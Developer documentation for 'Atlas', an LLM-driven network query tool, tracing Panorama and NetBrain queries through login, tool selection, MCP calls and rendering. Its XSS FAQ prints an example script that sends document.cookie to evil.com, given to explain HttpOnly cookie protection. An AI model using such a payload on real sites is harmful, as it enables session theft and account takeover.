# Panorama Query — End-to-End Flow

This document traces the complete lifecycle of a Panorama query through Atlas, from the moment a user types a message in the browser to the rendered response. Atlas supports two query paths:

- **Path 1: Direct MCP (`network` intent)** — group lookups, member listings, unused object queries. The LLM picks a tool, the tool calls Panorama directly, and the result is returned.
- **Path 2: A2A (`netbrain` intent)** — path queries where the NetBrain agent traces the route and calls the Panorama agent to enrich any firewall hops it encounters.

---

## Path 1: Direct MCP Query (network intent)

The steps below trace the full lifecycle of a direct Panorama query — "What address group is 11.0.0.1 part of?" — from browser to rendered response.

---

## Step 0: Authentication (One-Time Login)

**File:** [app.py](../../app.py), [auth.py](../../auth.py)

Authentication happens once per session — not on every query. Here's the full flow:

1. **User visits Atlas with no session** — they get redirected to `/login`.

2. **User clicks "Sign in with Microsoft"** — the browser is sent to Azure's login page. Atlas is not involved in credential checking.

3. **User authenticates on Azure** — enters password, completes MFA. Azure handles all of this.

4. **Azure redirects back to Atlas** — with a short-lived, single-use code in the URL that proves login succeeded.

5. **Atlas exchanges the code for user info** — the server (not the browser) contacts Azure directly to swap the code for the user's identity: name, email, and which AD groups they belong to. This never touches the browser — the user's credentials are never exposed.

6. **Atlas resolves the role** — the user's AD group is matched against the known roles (`admin`, `netadmin`, `guest`). If no match, login is rejected.

7. **A signed session cookie is set** — Atlas signs `{ username, group }` into a tamper-proof cookie (`atlas_session`) and sends it to the browser. The cookie expires after 30 minutes, is invisible to JavaScript, and is sent automatically on every subsequent request.

8. **User lands on Atlas** — authenticated. Every request to `/api/discover` and `/api/chat` now carries this cookie automatically.

---

## Step 1: User Types a Query (Frontend)

**File:** [frontend/src/components/chat/ChatInput.jsx](../../frontend/src/components/chat/ChatInput.jsx)
**File:** [frontend/src/stores/chatStore.js](../../frontend/src/stores/chatStore.js)

The user types `"What address group is 11.0.0.1 part of?"` and presses Enter. The input box clears and two HTTP requests fire simultaneously — `/api/discover` and `/api/chat` — both carrying the same body:

```json
{ "message": "What address group is 11.0.0.1 part of?", "conversation_history": [...] }
```

`conversation_history` contains the prior messages from the current conversation (up to the last 20), so the LLM has context from earlier exchanges.

---

## Step 2: Tool Pre-selection (`/api/discover`)

`/api/discover` exists purely for UI feedback. While `/api/chat` does the real work, `/api/discover` fires simultaneously and asks the LLM which tool it would use for this query. The result is used to update the loading indicator — e.g. from `"Identifying query..."` to `"Querying Panorama"`. If this call fails, the label falls back to `"Processing"` — `/api/chat` continues regardless.

The tool selection is repeated from scratch by `/api/chat`. This is intentional — discover is fire-and-forget for UX only.

---

## Step 3: Session & RBAC Check (FastAPI)

On every request, FastAPI reads the `atlas_session` cookie and verifies it. The cookie is cryptographically signed — if it has been tampered with, is missing, or has expired (30 min TTL), the request is rejected and the browser is redirected to `/login`.

If the cookie is valid, the user's identity and role are decoded from it. The role controls which tools they can call — this is checked later in Step 5. There is no server-side session store; everything is encoded in the cookie itself.

Once the session is confirmed valid, FastAPI proceeds — either the `/api/discover` handler or the `/api/chat` handler, depending on which of the two requests the browser sent simultaneously in Step 1.

---

## Step 4: FastAPI Routes to chat_service

Both `/api/discover` and `/api/chat` go through the same session check, then hand off to the same `process_message()` function in `chat_service.py`. The only difference is that `/api/discover` stops after tool selection (used to update the loading indicator), while `/api/chat` runs the full pipeline — tool execution, result formatting, and response.

---

## Step 5: Tool Discovery in chat_service

`process_message()` asks the MCP server for the list of available tools. Each tool has a name and a description that explains what it does and when to use it — this description comes directly from the function's docstring in [tools/panorama_tools.py](../../tools/panorama_tools.py):

```python
@mcp.tool()
async def query_panorama_ip_object_group(ip_address: str, ...) -> Dict[str, Any]:
    """
    Find which Panorama address groups contain a given IP address.

    Use for: queries with an IP address (has dots, e.g. "10.0.0.1") asking which address group it belongs to.
    Do NOT use for: device names (have dashes).

    Examples:
    - "what address group is 10.0.0.1 in?" → ip_address="10.0.0.1"
    """
```

Before invoking the LLM, a system prompt is assembled from skill files. `base.md` is always included. For queries containing Panorama keywords (e.g. "group", "address", "members"), `panorama_agent.md` is appended — it gives the LLM background knowledge about Panorama concepts like address objects, address groups, and device groups. This helps the LLM understand the query and pick the right tool. The skills have no effect on tool execution itself.

The LLM is then given the user's query, the system prompt, and all the tool descriptions, and asked to pick the right tool. It responds with a tool name and the arguments to call it with — for example, `query_panorama_ip_object_group` with `ip_address = "11.0.0.1"`.

Before the tool is called, the user's role is checked. If their role doesn't permit that tool, an error is returned immediately and nothing is executed.

If the request came from `/api/discover`, the process stops here and returns the tool name to update the loading indicator. If it came from `/api/chat`, it continues to execution.

---

## Step 6: MCP Tool Execution

**File:** [chat_service.py](../../chat_service.py) → `call_mcp_tool()`
**File:** [mcp_client.py](../../mcp_client.py)

```python
result = await call_mcp_tool(
    "query_panorama_ip_object_group",
    {"ip_address": "11.0.0.1"},
    timeout=65.0
)
```

The MCP client sends a JSON-RPC `tools/call` message over the streamable-http transport to `http://127.0.0.1:8765`. The MCP server (running as a separate process) receives it and dispatches to the registered `@mcp.tool()` handler.

---

## Step 7: panorama_tools.py — Tool Execution

**File:** [tools/panorama_tools.py](../../tools/panorama_tools.py)

The tool runs inside the MCP server. For `query_panorama_ip_object_group`, it does the following:

1. **Gets an API key** — fetches fresh credentials from Azure Key Vault and exchanges them for a Panorama API key via the Panorama keygen endpoint. No caching — a fresh key is used on every call.

2. **Finds all device groups** — queries Panorama for the list of device groups to search across (plus shared objects). Results are cached for 5 minutes to avoid unnecessary API calls.

3. **Finds address objects containing the IP** — for each device group, fetches all address objects and checks if `11.0.0.1` falls within any of them (exact match, CIDR range, or IP range). These fetches run in parallel.

4. **Finds address groups containing those objects** — for each matching address object, checks which address groups reference it (including nested groups resolved recursively).

5. **Returns the result:**

```python
{
    "ip_address": "11.0.0.1",
    "address_objects": [{"name": "web-server-01", "value": "11.0.0.0/24", ...}],
    "address_groups": [{"name": "web-servers", "members": ["web-server-01"], ...}]
}
```

---

## Step 8: Result Normalization (chat_service.py)

The raw result from the tool is a structured JSON object. Normalization adds a `direct_answer` field — a single plain-English sentence summarising the result. The frontend shows this as a highlighted badge at the top, with the full data tables rendered below it.

For example, after a `query_panorama_ip_object_group` call:

```
"11.0.0.1 is part of address group 'web-servers' (via web-server-01)"
```

> The LLM is not used here because it's faster and more reliable. Having the LLM rephrase a structured result adds latency and introduces the risk of hallucination or inconsistent wording. Since the result is already structured — we know the IP, the group name, the object name — the sentence can be constructed directly from the data with no ambiguity.

---

## Step 9: Conversation History Persistence (FastAPI)

The user's message and the assistant's response are saved to disk, keyed by username. If this is a new conversation, one is created and its ID is returned to the frontend so subsequent messages are appended to the same thread.

---

## Step 10: Response Rendering (Frontend)

The frontend receives the normalized result and inspects its shape to decide how to render it. If the result contains arrays (e.g. `address_groups`, `address_objects`), it is classified as a table response.

The UI renders two things:
1. The `direct_answer` as a highlighted badge at the top — e.g. `"11.0.0.1 is part of address group 'web-servers'"`
2. The full data as tables below it, in a fixed order: members → address objects → address groups → policies

---

## Path 2: A2A Queries

Used for path queries like "find path from 10.0.0.1 to 10.0.1.1". The NetBrain agent traces the network path and calls the Panorama agent mid-reasoning to enrich any firewall hops it encounters.

---

### Step 1: Intent Classification

The query `"find path from 10.0.0.1 to 10.0.1.1"` contains two IP addresses, so `classify_intent` assigns `intent = "netbrain"`. The LangGraph routes to the `netbrain_agent` node.

---

### Step 2: Atlas sends the query to the NetBrain agent

The `netbrain_agent` node in [graph_nodes.py](../../graph_nodes.py) forwards the raw user query as an A2A HTTP POST to the NetBrain agent running on port 8004.

---

### Step 3: NetBrain agent runs its tool-calling loop

**File:** [agents/netbrain_agent.py](../../agents/netbrain_agent.py)

The NetBrain agent receives the task and starts a tool-calling loop. Its system prompt (`skills/netbrain_agent.md`) gives it path query knowledge and instructs it to call the Panorama agent whenever it encounters a Palo Alto firewall hop.

The loop runs up to 5 iterations:

1. **LLM calls `netbrain_query_path`** — traces the hop-by-hop path between the two IPs via the NetBrain API.

   Result: path with 3 hops — `SW-CORE-01`, `PA-FW-LEANDER` (a firewall), `SW-EDGE-02`.

2. **LLM calls `ask_panorama_agent`** — because `PA-FW-LEANDER` is a Palo Alto firewall, the LLM sends a task to the Panorama agent asking for its zones and device group.

---

### Step 4: Panorama agent handles the enrichment request

**File:** [agents/panorama_agent.py](../../agents/panorama_agent.py)

The Panorama agent receives the A2A request on port 8003 and runs its own independent tool-calling loop with `skills/panorama_agent.md` as the system prompt. It calls its Panorama MCP tools to look up the firewall's zones and device group, then returns a natural language summary:

```
"PA-FW-LEANDER is in device group leander.
 Ethernet1/1: trust zone, Ethernet1/2: untrust zone."
```

The NetBrain agent has no visibility into this inner loop — it only receives the final text.

---

### Step 5: NetBrain agent produces the final answer

With the Panorama enrichment returned as a tool result, the LLM has everything it needs and produces a final answer — no more tool calls:

```
Path from 10.0.0.1 to 10.0.1.1 traverses 3 hops:
1. SW-CORE-01
2. PA-FW-LEANDER (device group: leander, Ethernet1/1→trust, Ethernet1/2→untrust)
3. SW-EDGE-02
```

---

### Step 6: Response rendered in the UI

The NetBrain agent's answer is returned to Atlas as an A2A artifact. Atlas extracts the text and passes it back to the frontend as a `direct_answer`, rendered as a highlighted response using ReactMarkdown.

---

## FAQ

### Why does Atlas use a session cookie?

HTTP is stateless — every request arrives at the server with no memory of who made previous requests. Without a cookie, FastAPI would have to demand credentials on every single request.

**The server sets the cookie — the browser stores and sends it.** After OIDC login, FastAPI signs a session payload (`{ username, group, auth_mode, created_at }`) using `itsdangerous.URLSafeTimedSerializer` and returns it in the HTTP response as a `Set-Cookie` header:

```
Set-Cookie: atlas_session=<signed-payload>; HttpOnly; SameSite=Lax
```

The browser saves this automatically. On every subsequent request to the same origin, the browser includes it in the request headers:

```
Cookie: atlas_session=<signed-payload>
```

FastAPI reads it back with `request.cookies.get("atlas_session")`, verifies the signature, and decodes the payload to identify the user — no database lookup, no server-side session store. The signed payload *is* the session, so sessions survive app restarts with no shared cache needed.

The `group` field drives RBAC: `_check_tool_access()` in `chat_service.py` reads it to decide which tools the user can call. The cookie is `HttpOnly` (JavaScript cannot read or steal it) and `SameSite=Lax` (blocks cross-site request forgery). Because the frontend and backend share the same origin (same scheme, host, and port), the browser attaches the cookie automatically — no explicit `credentials` setting is needed in the frontend fetch calls.

---

### What is AbortController / signal?

A browser `fetch()` call, once started, runs until the server responds or the network fails — there is no built-in way to cancel it from code. `AbortController` is the browser API that adds cancellation.

`new AbortController()` gives you a `controller` object and a `controller.signal`. Passing the `signal` into `fetch({ signal })` links the request to the controller. Calling `controller.abort()` immediately cancels the in-flight request and `fetch` throws an `AbortError`.

In Atlas, `chatStore.sendMessage` creates one `AbortController` per message send and stores it in state. The stop button calls `ctrl.abort()`, which cancels both the `/api/discover` and `/api/chat` requests simultaneously since they share the same signal. This is a **user-abort only** — there is no automatic timeout on `/api/discover`.

---

### Why does sendMessage go through the Zustand store instead of calling the API directly from ChatInput.jsx?

`ChatInput.jsx` could technically call `/api/discover` and `/api/chat` directly, but that would break several things:

**1. Multiple components share the same state.**
`ChatInput.jsx` is not the only component that needs to know what's happening. `ChatWindow.jsx` needs `messages` to render the conversation. A loading indicator needs `isLoading`. A status bar needs `currentStatus`. The stop button needs `abortController` to cancel the in-flight request. If `ChatInput.jsx` held all this as local state, sibling components would have no way to read it without passing props up through their common parent and back down — the standard React prop-drilling problem. With Zustand, any component subscribes directly: `useChatStore(s => s.isLoading)` — no prop chains.

**2. `sendMessage` orchestrates far more than one fetch.**
The function in `chatStore.js` manages:
- Adding the user message to the displayed conversation
- Creating an `AbortController` and storing it in state so the stop button (a completely separate component) can call `ctrl.abort()`
- Calling `/api/discover` → updating `currentStatus` to `"Querying Panorama"`
- Calling `/api/chat` → receiving and displaying the response
- Error handling, cleanup, and setting `isLoading: false`

If this logic lived inside `ChatInput.jsx`, the component would be doing application-level business logic, not UI rendering. It would also be impossible for the stop button to cancel a request whose `AbortController` is a local variable inside a different component.

**3. State must outlive the component.**
React component local state disappears when the component unmounts. Store state persists for the lifetime of the page. If `isLoading: true` were local to `ChatInput.jsx`, navigating away and back would reset it mid-request.

The separation is intentional: `ChatInput.jsx` is a pure UI component — text box, buttons, file picker, nothing else. `chatStore.js` is where all application logic and shared state live.

---

### What is the `state` parameter / CSRF token?

`state` and CSRF token are the same thing — `state` is the parameter name in the OAuth spec; "CSRF token" is what it's protecting against.

**The problem it solves:**

Without `state`, an attacker could trick your browser into completing a login flow that the attacker initiated:

1. Attacker starts an OAuth login on Atlas, gets an authorization URL with their own `code`
2. Attacker sends you a link to `http://localhost:8000/auth/callback?code=<attackers-code>&...`
3. Your browser hits the callback, Atlas exchanges the code — and you're now logged in as the attacker's account

**How `state` prevents this:**

1. When Atlas redirects to Azure, authlib generates a random `state` value (e.g. `a3f9x2`) and stores it in a temporary session cookie in your browser
2. That same `state` is sent as a query param in the authorization URL to Azure
3. Azure echoes it back unchanged: `GET /auth/callback?code=...&state=a3f9x2`
4. `authorize_access_token()` reads the `state` from the callback URL and compares it to what's in the session cookie
5. If they match → request came from your own browser's login flow → safe to proceed
6. If they don't match → something is wrong → rejected

The attack fails at step 4 because the attacker's crafted callback URL would have a `state` that doesn't match anything in your browser's session cookie — Atlas detects the mismatch and rejects it.

In short: **`state` proves that the callback was triggered by the same browser session that started the login.**

---

### Why does the token exchange use POST instead of GET?

The token endpoint exchanges the authorization code for tokens (id_token, access_token, refresh_token). It uses POST for four reasons:

1. **Secrets go in the body, not the URL.** The request includes `client_secret` and the authorization `code`. GET parameters appear in the URL, which gets logged in browser history, server access logs, and proxy logs. POST puts them in the request body, which is not logged by default.

2. **It's a destructive operation.** The authorization code is single-use — this POST consumes and invalidates it. REST convention: reads are GET, actions with side effects are POST.

3. **The OAuth 2.0 spec mandates it.** RFC 6749 §4.1.3 explicitly requires the token request to use POST with `application/x-www-form-urlencoded`. Every provider (Azure, Google, Okta) follows this spec.

4. **URLs have length limits.** GET parameters are in the URL. The `client_secret`, `code`, and `redirect_uri` together can be long — POST body has no practical size limit.

### What happens on a 401 response?

The 401 is sent by **FastAPI** (the app server) — not the browser. Both `/api/discover` and `/api/chat` check the session cookie at the top of the route handler. If the `atlas_session` cookie is missing, expired, or tampered with, FastAPI returns:

```json
HTTP 401
{ "detail": "Not authenticated", "redirect": "/login" }
```

The most common trigger is the 30-minute session TTL expiring while the user was idle. Since `/api/discover` fires first, the 401 typically arrives before `/api/chat` is even attempted.

On the frontend, `checkAuthRedirect` detects the 401, immediately sets `window.location.href = '/login'` — the page navigates away — and throws `'Not authenticated'`. The thrown error is caught by the inner try-catch in `chatStore` and falls back to `currentStatus: 'Processing'`, but the navigation has already happened so this is moot.

### What is XSS and why does HttpOnly protect against it?

**XSS (Cross-Site Scripting)** is an attack where malicious JavaScript is injected into a page and runs in the victim's browser, in the context of your origin — meaning it has the same privileges as your own code.

**How the attack works without HttpOnly:**

1. An attacker finds an input that gets rendered unsanitized into the page (e.g. a chat message displayed as raw HTML).
2. They submit `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`.
3. When another user views the page, the script runs, reads `document.cookie` (which includes `atlas_session`), and sends it to the attacker's server.
4. The attacker uses the stolen cookie to make authenticated requests to Atlas — they are now logged in as the victim.

**Why HttpOnly stops this:**

The browser enforces a hard rule: cookies marked `HttpOnly` are never exposed to JavaScript at all. `document.cookie` simply omits them. The injected `<script>` runs fine but gets back an empty string — there is nothing to steal. The cookie still travels in the `Cookie:` request header on every HTTPS request to the server (that's its entire purpose) — but JS code, including attacker-injected code, can never read it. "HTTP header" refers to the protocol layer, not the unencrypted scheme; HTTPS is just HTTP with TLS encryption on top, and the cookie is protected in transit by TLS regardless.

**What HttpOnly does not protect against:**

HttpOnly only blocks *reading* the cookie from JS. It does not stop an attacker from making requests that *carry* the cookie (the browser still attaches it). That class of attack — making authenticated requests on behalf of the user — is CSRF, which is what `SameSite=Lax` addresses.

**Atlas's exposure:**

Atlas renders chat responses from an LLM. If the LLM ever produced a response containing a `<script>` tag and the frontend rendered it as raw HTML, that would be an XSS vector. React's JSX escapes HTML by default (`dangerouslySetInnerHTML` is not used for chat messages), so injected tags are rendered as literal text — but `HttpOnly` is a second line of defence regardless.

---

### How does Atlas decide which path to take?

**File:** [`graph_nodes.py`](../../graph_nodes.py) — `classify_intent()`

Every query enters the LangGraph at `classify_intent`. The node inspects the prompt and returns one of several intents:

| Condition | Intent | Route |
|---|---|---|
| One IP + risk keywords (suspicious, threat, etc.) | `risk` | `risk_orchestrator` |
| Two IPs, or path keywords (path, route, trace, hops) | `netbrain` | `netbrain_agent` |
| Documentation question | `doc` | `doc_tool_caller` |
| Everything else | `network` | `fetch_mcp_tools` → tool selector |

Panorama queries like "what group is 11.0.0.1 in?" or "show unused address objects" fall through to `network`.

---

### What are skills and how do they differ from tool docstrings?

Skills are Markdown files in [`skills/`](../../skills/) loaded as system prompts. Each agent or LLM call has its own skill file:

| File | Loaded by | Purpose |
|---|---|---|
| `skills/base.md` | Main LangGraph (all queries) | Role statement + short-reply context hint |
| `skills/panorama_agent.md` | Panorama agent | Panorama domain knowledge (concepts, terminology, zones) |
| `skills/splunk_agent.md` | Splunk agent | Splunk domain knowledge (deny events, risk signals) |
| `skills/netbrain_agent.md` | NetBrain agent | Path query concepts, Panorama enrichment instructions |
| `skills/risk_synthesis.md` | Risk orchestrator synthesis | Output format + risk signal guidance |

**Design principle:** skills contain only domain knowledge. Tool selection logic lives in tool docstrings (`@mcp.tool()` descriptions). Sequential chaining logic lives in code (`tool_executor` deterministic chaining, `agent_loop.py`).

**MCP tool docstring** — scoped to one tool, answers: "should I call this tool, and with what arguments?"

```python
@mcp.tool()
async def query_panorama_ip_object_group(ip_address: str) -> dict:
    """
    Find which Panorama address groups contain a given IP address.

    Use for: queries with an IP address asking which group it belongs to.
    Do NOT use for: device names (have dashes).

    Examples:
    - "what address group is 10.0.0.1 in?" → ip_address="10.0.0.1"
    """
```

**Skill** — loaded as the system prompt, answers: "what domain am I working in and what do terms mean?"

```markdown
# skills/panorama_agent.md
You are working with Palo Alto Panorama — a centralized firewall management platform.

CONCEPTS:
- Address object: a named IP, range, or CIDR
- Address group: a named collection of address objects
- Device group: a set of firewalls managed together
- Security zone: trust, untrust, dmz
```

| Question | Where it lives |
|---|---|
| Should I call this tool? | Docstring (`Use for / Do NOT use for`) |
| What arguments do I pass? | Docstring (`Examples`) |
| What does "address group" mean? | Skill |
| What's the difference between a zone and a device group? | Skill |
| What format should my response be in? | Skill (`risk_synthesis.md`) |

---

## Sequence Diagram

```
User          Browser           FastAPI          chat_service       MCP Server      panoramaauth     Panorama
 │  type query  │                  │                   │                 │                │              │
 │─────────────►│                  │                   │                 │                │              │
 │              │ POST /api/discover│                   │                 │                │              │
 │              │─────────────────►│                   │                 │                │              │
 │              │                  │ validate session   │                 │                │              │
 │              │                  │ check RBAC         │                 │                │              │
 │              │                  │──process_message──►│                 │                │              │
 │              │                  │                   │ list_tools()───►│                 │              │
 │              │                  │                   │◄────────────────│                 │              │
 │              │                  │                   │ LLM: select tool│                 │              │
 │              │                  │                   │ (llama3.1:8b)   │                 │              │
 │              │                  │◄─ tool selected ───│               │                 │              │
 │              │◄─ {tool: "Panorama"}│                 │                │                 │              │
 │              │ POST /api/chat   │                   │                 │                │              │
 │              │─────────────────►│                   │                 │                │              │
 │              │                  │──process_message──►│                 │                │              │
 │              │                  │                   │ LLM: select tool│                 │              │
 │              │                  │                   │ call_mcp_tool()─►                │              │
 │              │                  │                   │                 │ get_api_key()──►│              │
 │              │                  │                   │                 │                │ GET keygen   │
 │              │                  │                   │                 │                │─────────────►│
 │              │                  │                   │                 │                │◄── API key ──│
 │              │                  │                   │                 │ query address  │              │
 │              │                  │                   │                 │ objects/groups │              │
 │              │                  │                   │                 │────────────────────────────► │
 │              │                  │                   │                 │◄─────────────── XML result ──│
 │              │                  │                   │◄── parsed dict ─│                │              │
 │              │                  │                   │ _normalize_result│               │              │
 │              │                  │◄── normalized JSON─│                │                │              │
 │              │◄─ {content: {...}}│                  │                 │                │              │
 │              │ render tables    │                   │                 │                │              │
 │◄─────────────│                  │                   │                 │                │              │
```

---

## Direct MCP vs A2A Agent: When Each Is Used

| | Direct MCP (network intent) | Agent via A2A (risk intent) |
|---|---|---|
| Trigger | Group/member lookups, unused objects | Risk assessment queries |
| Tool selection | Ollama LLM picks from all MCP tools | Ollama LLM within agent picks from Panorama-only tools |
| Chaining | Deterministic code in `tool_executor` | LLM-driven tool-calling loop |
| Output | Structured JSON → table/visualization | Natural language summary |
| Port | Via MCP server (internal) | HTTP 8003 |

---

## Key Files

| File | Role |
|---|---|
| [`graph_nodes.py`](../../graph_nodes.py) | LangGraph nodes: intent classification, tool selection, execution, risk orchestration |
| [`graph_builder.py`](../../graph_builder.py) | LangGraph graph construction and routing |
| [`graph_state.py`](../../graph_state.py) | State schema shared across all graph nodes |
| [`agents/panorama_agent.py`](../../agents/panorama_agent.py) | Panorama agent — AI agent exposing A2A interface (FastAPI, port 8003) |
| [`agents/splunk_agent.py`](../../agents/splunk_agent.py) | Splunk agent — AI agent exposing A2A interface (FastAPI, port 8002) |
| [`agents/netbrain_agent.py`](../../agents/netbrain_agent.py) | NetBrain agent — AI agent exposing A2A interface (FastAPI, port 8004) |
| [`agents/agent_loop.py`](../../agents/agent_loop.py) | Shared tool-calling loop used by all agents |
| [`agents/orchestrator.py`](../../agents/orchestrator.py) | Risk fan-out: parallel A2A calls + Ollama synthesis |
| [`tools/panorama_tools.py`](../../tools/panorama_tools.py) | Panorama MCP tool implementations + Panorama API calls |
| [`skills/panorama_agent.md`](../../skills/panorama_agent.md) | Panorama agent system prompt |
| [`skills/splunk_agent.md`](../../skills/splunk_agent.md) | Splunk agent system prompt |
| [`skills/netbrain_agent.md`](../../skills/netbrain_agent.md) | NetBrain agent system prompt |
| [`skills/risk_synthesis.md`](../../skills/risk_synthesis.md) | Risk synthesis system prompt |
| [`mcp_client.py`](../../mcp_client.py) | Client that calls the MCP server |
| [`mcp_server.py`](../../mcp_server.py) | MCP server process (FastMCP) |
| [`panoramaauth.py`](../../panoramaauth.py) | Panorama API key management |
